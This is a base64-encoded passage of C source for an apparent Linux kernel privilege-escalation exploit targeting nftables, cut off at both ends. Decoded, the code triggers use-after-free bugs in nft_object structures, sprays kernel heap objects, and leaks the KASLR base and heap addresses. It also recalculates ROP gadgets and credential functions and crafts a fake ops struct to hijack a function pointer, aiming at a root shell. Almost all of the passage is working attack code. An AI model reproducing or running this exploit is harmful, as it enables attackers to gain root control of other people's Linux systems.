YnllKCJbLV0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZSIpOwoJcmV0dXJuOwp9
CgovKiBPbmNlIGhhdmluZyBLQVNMUiBiYXNlLCByZWNhbGN1bGF0ZSBvZmZz
ZXRzICovCnZvaWQgcmVjYWxjdWxhdGVfZnJvbV9rYXNscl9iYXNlKHZvaWQp
IHsKCXVpbnQ2NF90IGtfZGlmZiA9IGthc2xyX2Jhc2UgLSBERUZBVUxUX0JB
U0U7Cgljb21taXRfY3JlZHMgKz0ga19kaWZmOwoJcHJlcGFyZV9rZXJuZWxf
Y3JlZCArPSBrX2RpZmY7Cgltb3ZfcmRpX3JheF9qbmVfeG9yX2VheF9lYXhf
cmV0ICs9IGtfZGlmZjsKCXBvcF9yZGlfcmV0ICs9IGtfZGlmZjsKCXhvcl9k
aF9kaF9yZXQgKz0ga19kaWZmOwoJc3RhY2tfcGl2b3RfYWRkciArPSBrX2Rp
ZmY7CglrcHRpX3RyYW1wb2xpbmUgKz0ga19kaWZmOwoJbW9kcHJvYmVfcGF0
aCArPSBrX2RpZmY7Cglwb3BfcmR4X3JldCArPSBrX2RpZmY7Cglwb3BfcmF4
X3JldCArPSBrX2RpZmY7Cgltb3ZfcXB0cl9yZHhfcmF4X3JldCArPSBrX2Rp
ZmY7CglyZXR1cm47Cn0KCi8qIFNldCB1cCBhIGhvb2sgZm9yIG91dHB1dCBw
YWNrZXRzIHVzaW5nIGEgc2V0IHdpdGgga2V5IGRlc3RpbmF0aW9uIHBvcnQg
YW5kIHZhbHVlIGEgcmVmZXJlbmNlZCBjb3VudGVyICovCnZvaWQgc2V0X3Vw
X2hvb2soY2hhciAqdGFibGUsIGNoYXIgKnNldCwgY2hhciAqY2hhaW4pIHsK
CWNoYXIgKmNtZCA9IE5VTEw7Cglhc3ByaW50ZigmY21kLCAibmZ0IGFkZCBy
dWxlICVzICVzIGNvdW50ZXIgbmFtZSB0Y3AgZHBvcnQgbWFwIEAlcyIsIHRh
YmxlLCBjaGFpbiwgc2V0KTsKCXN5c3RlbShjbWQpOwoJcmV0dXJuOwp9Cgov
KiBDb25uZWN0IHRvIGEgc2VydmVyIGluIGEgc3BlY2lmaWMgcG9ydCB0byB0
cmlnZ2VyIG5ldGZpbHRlciBob29rcyAqLwp2b2lkIHRyaWdfbmV0X3NvY2so
dm9pZCkgewoJaW50IHNvY2tmZCA9IDAsIGNvbm5mZCA9IDA7CglzdHJ1Y3Qg
c29ja2FkZHJfaW4gc2VydmFkZHIsIGNsaTsKCQoJYnplcm8oJnNlcnZhZGRy
LCBzaXplb2Yoc2VydmFkZHIpKTsKCWJ6ZXJvKCZjbGksIHNpemVvZihjbGkp
KTsKCQoJcHJpbnRmKCJcdFsqXSBDb25uZWN0aW5nIHRvIDEyNy4wLjAuMTol
ZC4uLlxuIiwgVFJJR19QT1JUKTsKCQoJc29ja2ZkID0gc29ja2V0KEFGX0lO
RVQsIFNPQ0tfU1RSRUFNLCAwKTsKCWlmKHNvY2tmZCA9PSAtMSkKCQlieWUo
IlstXSBTb2NrZXQgY3JlYXRpb24gZmFpbGVkIik7CgoJc2VydmFkZHIuc2lu
X2ZhbWlseSA9IEFGX0lORVQ7CglzZXJ2YWRkci5zaW5fYWRkci5zX2FkZHIg
PSBpbmV0X2FkZHIoVFJJR19IT1NUKTsKCXNlcnZhZGRyLnNpbl9wb3J0ID0g
aHRvbnMoVFJJR19QT1JUKTsKCglpZihjb25uZWN0KHNvY2tmZCwgKFNBKikm
c2VydmFkZHIsIHNpemVvZihzZXJ2YWRkcikpICE9IDApCgkJYnllKCJbLV0g
Q29ubmVjdGlvbiB3aXRoIHNlcnZlciBmYWlsZWQiKTsKCgl3cml0ZShzb2Nr
ZmQsICJBQUFBIiwgNCk7CgkKCWNsb3NlKHNvY2tmZCk7CgkKCXJldHVybjsK
fQoKLyogU3ByYXkgd2l0aCBzZXFfb3BlcmF0aW9ucyBzdHJ1Y3RzICovCnZv
aWQgc3ByYXlfc2VxX29wX2xvb3Aodm9pZCkgewoJaW50IGZkc1tNQVhfRkRT
XSA9IHsgMCB9OwoJaW50IGkgPSAwOwoJCglhc3NpZ25fdG9fY29yZShERUZf
Q09SRSk7CgkKCW1vZGlmeV9ybGltaXQoKTsKCQoJd2hpbGUoaSA8IE1BWF9G
RFMpIHsKCQlmZHNbaV0gPSBvcGVuKCIvcHJvYy9zZWxmL3N0YXQiLCBPX1JE
T05MWSk7CgkJaSsrOwoJfQoJcmV0dXJuOwp9CgovKiBTZXQgdXAgYSBzZXJ2
ZXIgdG8gcmVjZWl2ZSBob29rLXRyaWdnZXJpbmcgb3V0cHV0IHBhY2tldHMg
Ki8Kdm9pZCBzZXR1cF90cmlnX3NlcnZlcih2b2lkKSB7CglpbnQgc2ZkID0g
MCwgc29jayA9IDAsIHIgPSAwOwoJc3RydWN0IHNvY2thZGRyX2luIGFkZHJl
c3M7CglpbnQgb3B0ID0gMTsKCWludCBhZGRybGVuID0gc2l6ZW9mKGFkZHJl
c3MpOwoJY2hhciBidWZmZXJbMTAyNF0gPSB7IDAgfTsKCglpZigoc2ZkID0g
c29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCAwKSkgPT0gMCkKCQlieWUo
IlstXSBFcnJvciBhdCBzb2NrZXQoKSIpOwoKCWlmKHNldHNvY2tvcHQoc2Zk
LCBTT0xfU09DS0VULCBTT19SRVVTRUFERFIgfCBTT19SRVVTRVBPUlQsICZv
cHQsIHNpemVvZihvcHQpKSkKCQlieWUoIlstXSBFcnJvciBhdCBzZXRzb2Nr
b3B0KCkiKTsKCglhZGRyZXNzLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwoJYWRk
cmVzcy5zaW5fYWRkci5zX2FkZHIgPSBJTkFERFJfQU5ZOwoJYWRkcmVzcy5z
aW5fcG9ydCA9IGh0b25zKFRSSUdfUE9SVCk7CgoJaWYoYmluZChzZmQsIChz
dHJ1Y3Qgc29ja2FkZHIqKSZhZGRyZXNzLCAgc2l6ZW9mKGFkZHJlc3MpKSA8
IDApCgkJYnllKCJbLV0gRXJyb3IgYXQgYmluZCgpIik7CgoJaWYobGlzdGVu
KHNmZCwgMykgPCAwKQoJCWJ5ZSgiWy1dIEVycm9yIGF0IGxpc3RlbigpIik7
CgoJaWYoKHNvY2sgPSBhY2NlcHQoc2ZkLCAoc3RydWN0IHNvY2thZGRyKikm
YWRkcmVzcywgKHNvY2tsZW5fdCopJmFkZHJsZW4pKSA8IDApCgkJYnllKCJb
LV0gRXJyb3IgYXQgYWNjZXB0KCkiKTsKCglyID0gcmVhZChzb2NrLCBidWZm
ZXIsIDQpOwoKCXNsZWVwKDMpOwoKCWNsb3NlKHNvY2spOwoJY2xvc2Uoc2Zk
KTsKCglyZXR1cm47Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2
W10pIHsKCXN0cnVjdCBtbmxfc29ja2V0ICpzID0gTlVMTDsKCXN0cnVjdCBt
bmxfbmxtc2dfYmF0Y2ggKmJhdGNoID0gTlVMTDsKCXN0cnVjdCBubG1zZ2hk
ciAqbmggPSBOVUxMOwoJaW50IHIgPSAwLCBzZXEgPSAwOwoJdWludDE2X3Qg
a2xlbls2NF0gPSB7IDEgfTsKCWNoYXIgYnVmWzE2Mzg0XSA9IHsgMCB9OwoJ
Y2hhciAqa2xrX29ial9uYW1lID0gTlVMTDsKCWNoYXIgKmhsa19vYmpfbmFt
ZSA9IE5VTEw7CgljaGFyICpzcF9kID0gTlVMTDsKCXVpbnQ2NF90ICpzcF9k
X2wgPSBOVUxMOwoJY2hhciAqc3AyX2QgPSBOVUxMOwoJdWludDY0X3QgKnNw
Ml9kX2wgPSBOVUxMOwoJY2hhciAqcm9wX2QgPSBOVUxMOwoJdWludDY0X3Qg
KnJvcF9kX2wgPSBOVUxMOwoJc2l6ZV90IGtsa190cmllcyA9IDA7CglwdGhy
ZWFkX3QgdHg7Cgl2b2lkICpyZXR2YWwgPSBOVUxMOwoJaW50IHBpZCA9IDA7
CglpbnQgZmQgPSAwOwoJaW50IHBpcGVmZFsyXSA9IHsgMCB9OwoJaW50IHNm
ZCA9IDAsIGNmZCA9IDA7CglpbnQgaXNfc3VjY2VzcyA9IDA7CgljaGFyICpw
aXBlZmRfc3RyID0gTlVMTDsKCQoJaWYoZ2V0ZXVpZCgpID09IDApCgkJZ290
byBFWFBfUDsKCQkKCXBpcGUocGlwZWZkKTsKCQoJLyogCgkgICBEcm9wIGNh
bGxiYWNrIHNjcmlwdHMgdG8gYWNoaWV2ZSBMUEUgZnJvbSBtb2Rwcm9iZSB1
c2VybW9kZQoJICAgaGVscGVyIGV4ZWN1dGlvbgoJKi8KCWRyb3BfY2FsbGJh
Y2tfc2NyaXB0cygpOwoJCgkvKgoJICAgTGF1bmNoIHRoZSBwcm9jZXNzIHRo
YXQgd2lsbCBwb3AgdGhlIHJvb3Qgc2hlbGw6IGl0IG5lZWRzCgkgICB0byBi
ZSBvdXRzaWRlIG9mIHRoZSBuYW1lc3BhY2UKCSovCglwaWQgPSBmb3JrKCk7
CglpZihwaWQgPT0gMCkgewoJCWNsb3NlKHBpcGVmZFsxXSk7CgoJCXIgPSBy
ZWFkKHBpcGVmZFswXSwgJmlzX3N1Y2Nlc3MsIHNpemVvZihpbnQpKTsKCQlp
ZihyIDwgMCkKCQkJYnllKCJbLV0gRXhwbG9pdCBmYWlsZWQhIik7CgkJCgkJ
c2xlZXAoMik7CgkJCgkJaWYoaXNfc3VjY2VzcykKCQkJbGF1bmNoX3RyaWdn
ZXIoKTsKCQlleGl0KDApOwoJfQoJCgljbG9zZShwaXBlZmRbMF0pOwoJCglh
c3ByaW50ZigmcGlwZWZkX3N0ciwgIiVkIiwgcGlwZWZkWzFdKTsKCQoJLy91
bnNoYXJlKENMT05FX05FV05TIHwgQ0xPTkVfTkVXVVNFUiB8IENMT05FX05F
V05FVCk7CgoJLyoKCSAgIEV4ZWN1dGUgb3Vyc2VsdmVzIGluIGEgbmV3IG5l
dHdvcmsgbmFtZXNwYWNlIHRvCgkgICBiZSBhYmxlIHRvIHRyaWdnZXIgYW5k
IGV4cGxvaXQgdGhlIGJ1ZwoJKi8KCWNoYXIgKmFyZ3NbXSA9IHsKCQlVTlNI
QVJFX1BBVEgsICItVXJubSIsIGFyZ3ZbMF0sIHBpcGVmZF9zdHIsCgkJTlVM
TCwKCX07CglleGVjdnAoVU5TSEFSRV9QQVRILCBhcmdzKTsKCkVYUF9QOgoJ
aWYoYXJnYyAhPSAyKQoJCWJ5ZSgiWy1dIHBpcGUgZmQgbm90IHByb3ZpZGVk
IGZvciBuYW1lc3BhY2UgcHJvY2VzcyIpOwoJCglwaXBlZmRbMV0gPSBhdG9p
KGFyZ3ZbMV0pOwoKCS8qIEFzc2lnbiB0byBhIHNwZWNpZmljIENQVSBjb3Jl
IGZvciBoZWFwIHNoYXBpbmcgcmVsaWFiaWxpdHkgKi8KCWFzc2lnbl90b19j
b3JlKERFRl9DT1JFKTsKCQoJc3JhbmQodGltZShOVUxMKSk7CgkKCXB1dHMo
IlsqXSBTYXZpbmcgY3VycmVudCBzdGF0ZS4uLiIpOwoJc2F2ZV9zdGF0ZSgp
OwoJCgkvKiA9PT09PT09PT09PT09PT09PT09PT0gWyAgUHJlLWNsZWFudXAg
XSA9PT09PT09PT09PT09PT09PT09PT0gKi8KCQoJLyogUmVtb3ZlIGV4cGxv
aXQgdGFibGVzIGxlZnQgZnJvbSBvdGhlciBleGVjdXRpb25zICovCgkKCWRl
bGV0ZV90YWJsZShUQUJMRV9LTEtfVUFGX0EpOwoJZGVsZXRlX3RhYmxlKFRB
QkxFX0tMS19VQUZfQik7CgkKCWRlbGV0ZV90YWJsZShUQUJMRV9ITEtfVUFG
X0EpOwoJZGVsZXRlX3RhYmxlKFRBQkxFX0hMS19VQUZfQik7CglkZWxldGVf
dGFibGUoVEFCTEVfT0JKX1NQUkFZX0EpOwoJCglkZWxldGVfdGFibGUoVEFC
TEVfUkRfVUFGX0EpOwoJZGVsZXRlX3RhYmxlKFRBQkxFX1JEX1VBRl9CKTsK
CQoJZGVsZXRlX3RhYmxlKFRBQkxFX1JQX1VBRl9BKTsKCWRlbGV0ZV90YWJs
ZShUQUJMRV9SUF9VQUZfQik7CgkKCS8qID09PT09PT09PT09PT09PT09PT09
PSBbIFByZS1BbGxvYyBdID09PT09PT09PT09PT09PT09PT09PSAqLwoJCgkv
KgoJICAgIEFzIGEgcmVzdWx0IG9mIHRoZSB0YWJsZSBzcHJheWluZywgYWRk
aW5nIHRoZSB0cmF2ZXJzaW5nIHRvIGFkZAoJICAgIHRoZSBob29raW5nIHJ1
bGUgd2lsbCB0dXJuIHNsb3csIHdlIGNyZWF0ZSB0aGUgb2JqZWN0cyBmb3Ig
dGhlCgkgICAgbGFzdCBzdGFnZSBhdCB0aGUgdmVyeSBiZWdnaW5pbmcgb2Yg
dGhlIGV4cGxvaXQuCgkqLwoJCgljcmVhdGVfdWFmKFRBQkxFX1JQX1VBRl9B
LCBUQUJMRV9SUF9VQUZfQiwgT0JKX1JQX1VBRiwgU0VUX1JQX1VBRiwgT0JK
RUNUX1RZUEVfQ09VTlRFUiwgMCwgTlVMTCwgMSk7CglzZXRfdXBfaG9vayhU
QUJMRV9SUF9VQUZfQiwgU0VUX1JQX1VBRiwgQ0hBSU5fUlBfVUFGKTsKCQoJ
LyogPT09PT09PT09PT09PT09PT09PT09IFsgUGhhc2UgMSAtIEtBU0xSIExl
YWsgXSA9PT09PT09PT09PT09PT09PT09PT0gKi8KCQoJcHV0cygiW2ldIFBo
YXNlIDEgLSBLQVNMUiBsZWFrIik7CgpQSEFTRV8xOgoJcHV0cygiXHRbKl0g
VHJpZ2dlcmluZyBVQUYgb24gbmZ0X29iamVjdCBzdHJ1Y3QuLi4iKTsKCWts
a19vYmpfbmFtZSA9IHN0cl9yZXBlYXQoJ1gnLCAweDIwIC0gMik7CgljcmVh
dGVfdWFmKFRBQkxFX0tMS19VQUZfQSwgVEFCTEVfS0xLX1VBRl9CLCBrbGtf
b2JqX25hbWUsIFNFVF9LTEtfVUFGLCBPQkpFQ1RfVFlQRV9DT1VOVEVSLCAw
LCBOVUxMLCAwKTsKCQoJLyoKCSAgIFJpZ2h0IGF0IHRoZSB0aW1lIHdlIHJl
bW92ZSB0aGUgdGFibGUgdGhhdCBob2xkcyB0aGUgcmVmZXJlbmNlZCBvYmpl
Y3QsCgkgICB3ZSBuZWVkIHRvIHN0YXJ0IHNwcmF5aW5nIHdpdGggc2VxX29w
ZXJhdGlvbnMgc3RydWN0IHRvIHN1Y2NlZWQgaW4KCSAgIGxlYWtpbmcgc2lu
Z2xlX29wZW4oKSBhZGRyZXNzLCBhbmQgY2FsY3VsYXRpbmcgS0FTTFIgYmFz
ZSB0aGlzIHdheS4KCSovCgoJcHRocmVhZF9jcmVhdGUoJnR4LCBOVUxMLCAo
dm9pZCAqKXNwcmF5X3NlcV9vcF9sb29wLCBOVUxMKTsKCQoJZGVsZXRlX3Rh
YmxlKFRBQkxFX0tMS19VQUZfQSk7CglwdXRzKCJcdFsqXSBTcHJheWluZyB3
aXRoIHNlcV9vcGVyYXRpb25zIHN0cnVjdHMuLi4iKTsKCglwdGhyZWFkX2pv
aW4odHgsICZyZXR2YWwpOwoJCgkvKgoJICAgSWYgd2Ugc3VjY2VlZCBpbiBt
YWtpbmcgYSBzZXFfb3BlcmF0aW9ucyBzdHJ1Y3QgYmUgYWxsb2NhdGVkIHJp
Z2h0IHdoZXJlCgkgICBvdXIgb2JqLT5rZXkubmFtZSBzdHJpbmcgd2FzLCB3
ZSB3aWxsIGJlIGFibGUgdG8gbGVhayB0aGUgc2luZ2xlX29wZW4oKQoJICAg
YWRkcmVzcyBieSByZXF1ZXN0aW5nIHRoZSBvYmplY3QgbmFtZSB0aHJvdWdo
IHRoZSBtYXAuCgkgICAKCSAgIFRoaXMgdGhvdWdoIGhhcyBhbm90aGVyIHJl
cXVpcmVtZW50LCB3aGljaCBpcyB0aGF0IG9iaiBpcyBpbnRhY3QsIHNvIHRo
YXQKCSAgIHRoZSBwb2ludGVyIHRvIHRoZSBvYmotPmtleS5uYW1lIGNodW5r
IGlzIHN0aWxsIGV4aXN0aW5nLgoJICAgCgkqLwoJCglzb19sZWFrZWRfYWRk
ciA9IHBhcnNlX3VhZl9vYmpfbmFtZV9sZWFrKFRBQkxFX0tMS19VQUZfQiwg
U0VUX0tMS19VQUYsIDB4NDAgKyAxMiwgMCk7CglpZihzb19sZWFrZWRfYWRk
ciA9PSAwIHx8IChzb19sZWFrZWRfYWRkciAmIDB4ZmZmZjAwMDAwMDAwMDAw
MCkgIT0gMHhmZmZmMDAwMDAwMDAwMDAwKSB7CgkJZGVsZXRlX3RhYmxlKFRB
QkxFX0tMS19VQUZfQik7CgkJYnllKCJbLV0gc2luZ2xlX29wZW4oKSBsZWFr
IGZhaWxlZCEiKTsKCX0KCQoJcHV0cygiXHRbKl0gQ2xlYW5pbmcgdXAgZGVz
Y3JpcHRvcnMuLi4iKTsKCQoJLyogQ2xlYW51cCBkZXNjcmlwdG9ycyB1c2Vk
IGluIHRoZSBzZXFfb3BlcmF0aW9ucyBzcHJheWluZyAqLwoJZm9yKGludCBp
ID0gMCA7IGkgPCBNQVhfRkRTIDsgaSsrKQoJCWNsb3NlKGZkc1tpXSk7CgkK
CXByaW50ZigiXHRbK10gTGVha2VkOiBzaW5nbGVfb3BlbigpIEAgMHglbHhc
biIsIHNvX2xlYWtlZF9hZGRyKTsKCQoJa2FzbHJfYmFzZSA9IHNvX2xlYWtl
ZF9hZGRyIC0gU0lOR0xFX09QRU5fT0ZGOwoJCglwcmludGYoIlx0WytdIExl
YWtlZDogS0FTTFIgYmFzZSBAIDB4JWx4XG4iLCBrYXNscl9iYXNlKTsKCgkv
KiBPbmNlIHdpdGggS0FTTFIgYmFzZSwgcmVjYWxjdWxhdGUgb2Zmc2V0cyBm
b3IgZXZlcnkgYWRkcmVzcyB3ZSBuZWVkICovCglyZWNhbGN1bGF0ZV9mcm9t
X2thc2xyX2Jhc2UoKTsKCQoJcHJpbnRmKCJcdFsrXSBMZWFrZWQ6IHByZXBh
cmVfa2VybmVsX2NyZWQoKSBAIDB4JWx4XG4iLCBwcmVwYXJlX2tlcm5lbF9j
cmVkKTsKCXByaW50ZigiXHRbK10gTGVha2VkOiBjb21taXRfY3JlZHMoKSBA
IDB4JWx4XG4iLCBjb21taXRfY3JlZHMpOwoJCgkvKiBDbGVhbnVwIChmcm9t
IHBoYXNlIDEpICovCgkKCXB1dHMoIlx0WypdIENsZWFuaW5nIHVwLi4uIik7
CglkZWxldGVfdGFibGUoVEFCTEVfS0xLX1VBRl9CKTsKCQoJLyogPT09PT09
PT09PT09PT09PT09PT09IFsgUGhhc2UgMiAtIGN0eC0+dGFibGUgbGVhayBd
ID09PT09PT09PT09PT09PT09PT09PSAqLwoJCglwdXRzKCJbaV0gUGhhc2Ug
MiAtIGN0eC0+dGFibGUgbGVhayIpOwoJClBIQVNFXzI6CgoJLyoKCSAgIE91
ciBvYmplY3RpdmUgbm93IGlzIG1ha2luZyBuZnRfb2JqZWN0cyBiZSBhbGxv
Y2F0ZWQgd2hlcmUgb3VyIG9iai0+a2V5Lm5hbWUKCSAgIHN0cmluZyB3YXMs
IHJpZ2h0IGFzIHdlIGRpZCBmb3IgdGhlIEtBU0xSIGxlYWsgcGhhc2UuCgkg
ICAKCSAgIFRvIGRvIHNvLCB3ZSBuZWVkIHRvIHByb3ZpZGUgYSBzdHJpbmcg
b2YgMHhjOCAtIDEgYnl0ZXMgZm9yIHRoZSBvYmplY3QgbmFtZS4KCSAgIElm
IHdlIHN1Y2NlZWQsIHdlIHdpbGwgbGVhayB0aGUgZmlyc3QgZW50cnkgb2Yg
b25lIG9mIHRoZSBzcHJheWVkIG9iamVjdHMsCgkgICB3aGljaCBpcyBvYmot
Pmxpc3QubmV4dCwgYW5kIHRoaXMgb25lIHBvaW50cyB0byAmY3R4LT50YWJs
ZS0+b2JqZWN0cwoJKi8KCglwdXRzKCJcdFsqXSBUcmlnZ2VyaW5nIFVBRiBv
biBuZnRfb2JqZWN0IHN0cnVjdC4uLiIpOwoJaGxrX29ial9uYW1lID0gc3Ry
X3JlcGVhdCgnRScsIDB4YzggLSAxKTsKCWNyZWF0ZV91YWYoVEFCTEVfSExL
X1VBRl9BLCBUQUJMRV9ITEtfVUFGX0IsIGhsa19vYmpfbmFtZSwgU0VUX0hM
S19VQUYsIE9CSkVDVF9UWVBFX0xJTUlULCAxLCBUQUJMRV9PQkpfU1BSQVlf
QSwgMCk7CglkZWxldGVfdGFibGUoVEFCTEVfSExLX1VBRl9BKTsKCQoJcHV0
cygiXHRbKl0gU3ByYXlpbmcgd2l0aCBuZnRfb2JqZWN0IHN0cnVjdHMuLi4i
KTsKCXRibF9sZWFrZWRfYWRkciA9IHNwcmF5X25mdF9vYmplY3QoVEFCTEVf
T0JKX1NQUkFZX0EsIDEyOSwgVEFCTEVfSExLX1VBRl9CLCBTRVRfSExLX1VB
Rik7CglpZih0YmxfbGVha2VkX2FkZHIgPT0gMCB8fCAodGJsX2xlYWtlZF9h
ZGRyICYgMHhmZmZmMDAwMDAwMDAwMDAwKSAhPSAweGZmZmYwMDAwMDAwMDAw
MDApIHsKCQlkZWxldGVfdGFibGUoVEFCTEVfSExLX1VBRl9CKTsKCQlkZWxl
dGVfdGFibGUoVEFCTEVfT0JKX1NQUkFZX0EpOwoJCWJ5ZSgiWy1dIGN0eC0+
dGFibGUgbGVhayBmYWlsZWQhIik7Cgl9CgkJCgl0YmxfbGVha2VkX2FkZHIg
PSB0YmxfbGVha2VkX2FkZHIgLSBPRkZfVE9fT0JKX0xTVDsKCQoJcHJpbnRm
KCJcdFsrXSBMZWFrZWQ6IGN0eC0+dGFibGUgKFwidGFibGUzXCIpIEAgMHgl
bHhcbiIsIHRibF9sZWFrZWRfYWRkcik7CglwcmludGYoIlx0WytdIExlYWtl
ZDogJmN0eC0+dGFibGUtPm9iamVjdHMgKFwidGFibGUzXCIpIEAgMHglbHhc
biIsIHRibF9sZWFrZWRfYWRkciArIE9GRl9UT19PQkpfTFNUKTsKCQoJLyog
PT09PT09PT09PT09PT09PT09PT09IFsgUGhhc2UgMyAtIGN0eC0+dGFibGUt
Pm9iamVjdHMubmV4dCBsZWFrIF0gPT09PT09PT09PT09PT09PT09PT09ICov
CgoJcHV0cygiW2ldIFBoYXNlIDMgLSBjdHgtPnRhYmxlLT5vYmplY3RzLm5l
eHQgbGVhayIpOwoKCXNsZWVwKDEuMik7CgpQSEFTRV8zOgoKCS8qCgkgICBB
dCB0aGlzIHBvaW50LCB3ZSBoYXZlIGEga25vd24gYWRkcmVzcyBvZiBhbiBh
ZGRyZXNzIHdoZXJlIHdlIGNhbiBzdG9yZSBjb250ZW50cyBieQoJICAgc3By
YXlpbmcsIHdoaWNoIGlzIGV4YWN0bHkgd2hhdCB3ZSBuZWVkIGZvciBhIGZh
a2UgbmZ0X29iamVjdF9vcHMgc3RydWN0IHJlc2lkaW5nIGluCgkgICB0aGUg
a2VybmVsIGhlYXAuCgkgICAKCSAgIFRvIHJldHJpZXZlIHRoaXMgYWRkcmVz
cywgd2UgY2FuIHByZXBhcmUgYW5vdGhlciBVQUYgY29uZGl0aW9uLCBhbmQg
dGFrZSBvdmVyIHRoZQoJICAgY29udGVudHMgb2YgdGhlIG5mdF9vYmplY3Qs
IHVzZSBubGFfbWVtZHVwKCkgc3ByYXlpbmcgdGhyb3VnaCB0YWJsZSBjcmVh
dGlvbiB0bwoJICAgcmVwbGFjZSBpdHMgY29udGVudHMgYW5kIHBsYWNlIGlu
IG9iai0+a2V5Lm5hbWUgYW4gYXJiaXRyYXJ5IGFkZHJlc3MsIHRoaXMgd2F5
CgkgICB3ZSBnZXQgYSBmdWxsIGFyYml0cmFyeSByZWFkIHByaW1pdGl2ZSwg
dGhhdCBsZXQgdXMgcmVhZCBieXRlcyBhdCBhbnkga25vd24KCSAgIHZhbGlk
IGFkZHJlc3MuIFdlIGFyZSB0aG91Z2ggYSBiaXQgbGltaXRlZCBpbiB0aGF0
IHRoaXMgcG9pbnRlciBpcyB0cmVhdGVkIGFzCgkgICBhIHN0cmluZyBwb2lu
dGVyLCBhbmQgd2Ugd2lsbCBiZSBhYmxlIHRvIHJlYWQgdW50aWwgYSBudWxs
IHRlcm1pbmF0b3IgaXMgZm91bmQuCgkgICAKCSAgIFVzaW5nIHRoaXMgYXJi
aXRyYXJ5IHJlYWQgcHJpbWl0aXZlLCB3ZSB3aWxsIHJlYWQgdGhlIGNvbnRl
bnRzIG9mICZjdHgtPnRhYmxlLT5vYmplY3RzCgkgICB3aGljaCBpcyBjdHgt
PnRhYmxlLT5vYmplY3RzLm5leHQsIGFuZCB0aGUgYWRkcmVzcyBjb250YWlu
ZWQgdGhlcmUgaXMgdGhlIGFkZHJlc3Mgb2YKCSAgIG9uZSBvZiB0aGUgbmZ0
X29iamVjdHMgd2UgdXNlZCB0byBzcHJheS4KCSovCgoJc3BfZCA9IGNhbGxv
YygweGM4LCBzaXplb2YoY2hhcikpOwoJaWYoIXNwX2QpCgkJYnllKCJbLV0g
RXJyb3IgYXQgY2FsbG9jKCkiKTsKCXNwX2RfbCA9ICh1aW50NjRfdCAqKXNw
X2Q7CgkKCW1lbXNldChzcF9kLCAnQScsIDB4YzgpOwoJCgkvKiBvYmotPmtl
eS1uYW1lIGVudHJ5ICovCglzcF9kX2xbNF0gPSAodGJsX2xlYWtlZF9hZGRy
ICsgT0ZGX1RPX09CSl9MU1QpICsgMTsgLy8gIisgMSIgYmVjYXVzZSBmaXJz
dCBieXRlIHdpbGwgYmUgbnVsbAoJCglwdXRzKCJcdFsqXSBUcmlnZ2VyaW5n
IFVBRiBvbiBuZnRfb2JqZWN0IHN0cnVjdC4uLiIpOwoJY3JlYXRlX3VhZihU
QUJMRV9SRF9VQUZfQSwgVEFCTEVfUkRfVUFGX0IsIE9CSl9SRF9VQUYsIFNF
VF9SRF9VQUYsIE9CSkVDVF9UWVBFX0NPVU5URVIsIDAsIE5VTEwsIDApOwoJ
ZGVsZXRlX3RhYmxlKFRBQkxFX1JEX1VBRl9BKTsKCXNwcmF5X21lbWR1cChz
cF9kLCAweGM4LCAyMDQ4KTsKCQoJc2xlZXAoMSk7CgkKCW9ial9sZWFrZWRf
YWRkciA9IHBhcnNlX3VhZl9vYmpfbmFtZV9sZWFrKFRBQkxFX1JEX1VBRl9C
LCBTRVRfUkRfVUFGLCAweDQwICsgOCwgMSk7CglpZihvYmpfbGVha2VkX2Fk
ZHIgPT0gMCB8fCAob2JqX2xlYWtlZF9hZGRyICYgMHhmZmZmMDAwMDAwMDAw
MDAwKSAhPSAweGZmZmYwMDAwMDAwMDAwMDApIHsKCQlwdXRzKCJbLV0gKmN0
eC0+dGFibGUtPm9iamVjdHMgbGVhayBmYWlsZWQhIik7CgkJZ290byBGSU5B
TF9DTEVBTlVQOwoJfQoJCglwcmludGYoIlx0WytdIExlYWtlZDogY3R4LT50
YWJsZS0+b2JqZWN0cy5uZXh0IEAgMHglbHhcbiIsIG9ial9sZWFrZWRfYWRk
cik7CgkKCS8qID09PT09PT09PT09PT09PT09PT09PSBbIFBoYXNlIDQgLSBD
cmFmdCBmYWtlIG5mdF9vYmplY3Rfb3BzIHN0cnVjdCBdID09PT09PT09PT09
PT09PT09PT09PSAqLwoKCXB1dHMoIltpXSBQaGFzZSA0IC0gQ3JhZnQgZmFr
ZSBuZnRfb2JqZWN0X29wcyBzdHJ1Y3QiKTsKClBIQVNFXzQ6CgoJLyoKCSAg
IFdlIGtub3cgdGhlIGFkZHJlc3Mgb2YgYW4gb2JqZWN0IGZvciB3aGljaCB3
ZSBjYW4gY29udHJvbCBpdHMgY29udGVudHMuIFdlIG5lZWQgbm93CgkgICB0
byBhY2hpZXZlIHRoaXMgbGFzdCBieSBkZWxldGluZyB0aGUgdGFibGUgd2hl
cmUgdGhlc2Ugb2JqZWN0cyByZXNpZGUsIHRvIHRoZW4gc3ByYXkKCSAgIHdp
dGggbmxhX21lbWR1cCgpIGFsbG9jYXRpb25zIGFzIGEgcmVzdWx0IG9mIHRh
YmxlIGNyZWF0aW9uLiBUaGlzIHdheSB3ZSBjYW4gcGxhY2UKCSAgIGFueSBj
b250ZW50cyB3ZSB3YW50IGluIHRoZXNlIG9iamVjdHMsIGFuZCB3ZSBrbm93
IGZvciBjZXJ0YWluIG9uZSBvZiB0aGVtIHdpbGwgYmUKCSAgIHRoZSBvbmUg
Zm9yIHdoaWNoIHdlIGtub3cgdGhlIGFkZHJlc3MuCgkgICAKCSAgIEFzIGEg
cmVzdWx0LCB3ZSB3aWxsIHByZWRpY3QgdGhhdCBpbiBhIHNwZWNpZmljIGtu
b3duIGhlYXAgYWRkcmVzcyB0aGVyZSB3aWxsIGJlCgkgICBhIGZha2UgbmZ0
X29iamVjdF9vcHMgc3RydWN0LCB3aGljaCB3ZSB3aWxsIHVzZSBpbiB0aGUg
bmV4dCBwaGFzZSBmb3Igb2JqLT5vcHMtPmV2YWwKCSAgIGZ1bmN0aW9uIHBv
aW50ZXIgaGlqYWNraW5nLgoJKi8KCQoJcHV0cygiXHRbKl0gRnJlZWluZyBz
cHJheWVkIG5mdF9vYmplY3Qgc3RydWN0cy4uLiIpOwoJZGVsZXRlX3RhYmxl
KFRBQkxFX09CSl9TUFJBWV9BKTsKCQoJc3AyX2QgPSBjYWxsb2MoMHhjOCwg
c2l6ZW9mKGNoYXIpKTsKCWlmKCFzcDJfZCkKCQlieWUoIlstXSBFcnJvciBh
